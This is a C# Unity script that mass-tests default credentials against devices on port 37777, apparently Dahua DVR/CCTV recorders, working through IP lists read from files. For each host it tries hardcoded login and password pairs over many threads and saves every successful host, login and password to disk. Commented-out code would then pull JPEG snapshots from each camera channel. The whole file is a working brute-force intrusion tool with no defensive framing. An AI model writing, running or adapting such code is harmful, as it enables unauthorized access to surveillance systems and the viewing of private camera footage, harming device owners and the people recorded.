using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.UI;
using System;
using System.Data;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using System.Net.Http;
using DahuaSharp.Packets;
using DahuaSharp;
public class CheckLogin : MonoBehaviour
{
    List<string> _login;
    List<string> _password1;
    List<string> _password2;
    List<string> _password3;
    List<string> _password4;
    TcpClient _Client;
    NetworkStream _NStream;
    int countThread;
    public Text _text;
    public Text _text2;
    public Text _find;
    List<string> GoodIPList = new List<string>();
    List<string> BedIPList = new List<string>();
    int allIP;
    int _findIP;
    void Start()
    {
        allIP = 0;
        countThread = 0;
        _login = new List<string>();
        _password1 = new List<string>();
        _password2 = new List<string>();
        _password3 = new List<string>();
        _password4 = new List<string>();
        _login.Add("admin");
        _login.Add("666666");
        _login.Add("888888");
        _login.Add("default");
        _login.Add("system");
        _login.Add("user");
        _login.Add("operator");
        _login.Add("asus");

        _password1.Add("admin");
        _password1.Add("admin123");
        _password1.Add("666666");
        _password1.Add("888888");

        _password2.Add("1234");
        _password2.Add("12345");
        _password2.Add("123456");
        _password2.Add("default");

        _password3.Add("admin1234");
        _password3.Add("admin12345");
        _password3.Add("admin123456");
        _password3.Add("tluafed");

        _password4.Add("88888888q");
        _password4.Add("default11");
        _password4.Add("smart377");
        _password4.Add("default12");
        StartCoroutine(CheckPort());
        StartCoroutine(Status());
        // TestJPG("175.100.103.195","admin","admin");
        // CheckPort();
    }
    IEnumerator Status()
    {
        while(true)
        {
            _text.text = countThread.ToString();
            _text2.text = allIP.ToString();
            _find.text = _findIP.ToString();
            yield return new WaitForSeconds(1.0f);
        }
    }
    IEnumerator CheckPort()
    {
        var AllRange4 = File.ReadAllLines("IPList4.txt");
        allIP = AllRange4.Length;
        _text2.text = allIP.ToString();
        foreach (var Host in AllRange4)
        {
            allIP--;
            countThread++;
            var _thread = new Thread(() =>
            {
                LoginPassword(Host, _password4);
            });
            _thread.Start();
            yield return new WaitForSeconds(0.5f);
        }
        yield return new WaitForSeconds(20.0f);
        // File.AppendAllLines("GoodIP4.txt", GoodIPList);
        // GoodIPList.Clear();
        File.AppendAllLines("IPList5.txt", AllRange4);
        File.Delete("IPList4.txt");
        File.Create("IPList4.txt").Close();

        var AllRange3 = File.ReadAllLines("IPList3.txt");
        allIP = AllRange3.Length;
        _text2.text = allIP.ToString();
        foreach (var Host in AllRange3)
        {
            allIP--;
            countThread++;
            var _thread = new Thread(() =>
            {
                LoginPassword(Host, _password3);
            });
            _thread.Start();
            yield return new WaitForSeconds(0.5f);
        }
        yield return new WaitForSeconds(20.0f);
        // File.AppendAllLines("GoodIP3.txt", GoodIPList);
        // GoodIPList.Clear();
        File.AppendAllLines("IPList4.txt", AllRange3);
        File.Delete("IPList3.txt");
        File.Create("IPList3.txt").Close();

        var AllRange2 = File.ReadAllLines("IPList2.txt");
        allIP = AllRange2.Length;
        _text2.text = allIP.ToString();
        foreach (var Host in AllRange2)
        {
            allIP--;
            countThread++;
            var _thread = new Thread(() =>
            {
                LoginPassword(Host, _password2);
            });
            _thread.Start();
            yield return new WaitForSeconds(0.5f);
        }
        yield return new WaitForSeconds(20.0f);
        // File.AppendAllLines("GoodIP2.txt", GoodIPList);
        // GoodIPList.Clear();
        File.AppendAllLines("IPList3.txt", AllRange2);
        File.Delete("IPList2.txt");
        File.Create("IPList2.txt").Close();

        var AllRange = File.ReadAllLines("IPList1.txt");
        allIP = AllRange.Length;
        _text2.text = allIP.ToString();
        foreach (var Host in AllRange)
        {
            allIP--;
            countThread++;
            var _thread = new Thread(() =>
            {
                LoginPassword(Host, _password1);
            });
            _thread.Start();
            yield return new WaitForSeconds(0.5f);
        }
        yield return new WaitForSeconds(20.0f);
        // File.AppendAllLines("GoodIP1.txt", GoodIPList);
        // GoodIPList.Clear();
        File.AppendAllLines("IPList2.txt", AllRange);
        File.Delete("IPList1.txt");
        File.Create("IPList1.txt").Close();
    }
    void LoginPassword(string Host, List<string> Pass)
    {
        try
        {
            _Client = new TcpClient();
            _Client.Connect(Host, 37777);
            _NStream = _Client.GetStream();
            foreach (var Login in _login)
            {
                foreach (var Password in Pass)
                {
                    try
                    {
                        Login packet = new Login(Login, Password);
                        packet.Serialize(_NStream);
                        var response = BinarySerializer.Deserialize<LoginResponse>(_NStream);
                        if (response.ReturnCode == 0)
                        {
                            File.Create($"IP\\" + Host +";"+ Login +";"+ Password);
                            // GoodIPList.Add(Host);
                            // countThread--;
                            _findIP++;
                        }
                    }
                    catch{}
                }
            }
        }
        catch{}
        _Client.Close();
        countThread--;
    }
    // Debug.Log(Host + " Channels: " + response.NumberChannels + " Login: " + Login + " Password^ " + Password);
    // int ChanelCount = response.NumberChannels-1;
    // while(ChanelCount > -1)
    // {
    //     TestJPG((byte)ChanelCount, Host, Login, Password);
    //     ChanelCount--;
    // }
    // void TestJPG(string Host, string Login, string Password)
    // {
        // int count = 0;
        // _Client = new TcpClient();
        // _Client.Connect(Host, 37777);
        // _NStream = _Client.GetStream();
        // Login packet = new Login(Login, Password);
        // packet.Serialize(_NStream);
        // while (count < 20)
        // {
            // try
            // {
                // var request = new CaptureRequest((byte)count);
                // request.Serialize(_NStream);
                // CaptureResponse response;   
                // using (MemoryStream ms = new MemoryStream())
                // {
                //     do
                //     {
                //         response = BinarySerializer.Deserialize<CaptureResponse>(_NStream);
                //         var bytes = _NStream.ReadResponse(response.Length);
                //         if(bytes.Length > 0)
                //         {
                //             ms.Write(bytes, 0, bytes.Length);
                //         }
                //     } while (response.Length > 0);
                //     File.WriteAllBytes($"Screenshot\\" + Host + "_" + Login + "_" + Password + "_" +  count + ".jpg", ms.ToArray());
                // }
            // }
            // catch (Exception e)
            // catch
            // {
            //     Debug.Log(Host + " Ошибка " + count + " : " + e.Message);
            // }
        //     count++;
        //     Debug.Log(count);
        // }
    // }
}
